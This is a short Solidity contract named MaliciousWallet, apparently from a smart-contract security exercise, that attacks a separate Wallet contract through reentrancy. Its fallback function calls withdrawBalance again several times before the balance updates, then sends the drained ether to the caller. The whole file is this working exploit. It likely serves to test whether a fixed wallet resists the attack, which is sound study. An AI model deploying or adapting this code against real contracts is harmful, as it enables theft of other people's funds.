pragma solidity ^0.5.8;

import "./FixWalletB.sol";


contract MaliciousWallet {
    uint private iterations = 0;
    uint constant private MAX_ITERATION = 3;
    Wallet wallet;

    constructor(address walletAddress) public {
        wallet = Wallet(walletAddress);
    }

    function deposit() external payable {
        wallet.deposit.value(msg.value)();
    }

    function withdraw() external payable {
        iterations = 0;
        wallet.withdrawBalance();
        msg.sender.transfer(address(this).balance);
    }

    function() external payable{
        if (iterations < MAX_ITERATION - 1) {
            iterations += 1;
            wallet.withdrawBalance();
        }
    }
}
